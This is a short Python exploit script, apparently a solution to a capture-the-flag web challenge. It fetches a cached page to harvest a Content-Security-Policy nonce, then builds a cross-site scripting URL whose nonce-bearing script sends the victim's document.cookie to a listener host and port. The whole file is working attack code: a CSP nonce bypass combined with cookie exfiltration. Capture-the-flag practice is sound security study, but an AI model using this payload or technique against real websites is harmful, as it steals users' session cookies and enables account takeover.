#!/usr/bin/env python

import re
import sys
import json
import random
import string
import requests
from urllib.parse import quote

CHALLENGE_HOST = 'numtonce.fluxfingersforfuture.fluxfingers.net'
CHALLENGE_PORT = 80
EXFIL_BASE_HOST = '127.0.0.1'
EXFIL_BASE_PORT = 60003


def exploit():
    # cache a CSP nonce
    unique = ''.join(random.choices(string.hexdigits, k=16))
    cached_url = 'http://{}:{}/index.php/{}.css'.format(CHALLENGE_HOST, CHALLENGE_PORT, unique)
    r = requests.get(cached_url)
    csp = r.headers['content-security-policy']
    nonce = re.match(r'.*nonce-([a-f0-9]+).*', csp).group(1)
    
    payload = '{}<script/nonce="{}">location="http://{}:{}/?flag="+encodeURIComponent(document.cookie)</script>'.format(CHALLENGE_HOST, nonce, EXFIL_BASE_HOST, EXFIL_BASE_PORT)
    url = '{}#{}'.format(cached_url, quote(payload))
    
    print(url)


def main():
    exploit()


if __name__ == '__main__':
    if len(sys.argv) == 2:
        CHALLENGE_HOST = sys.argv[1]
    main()
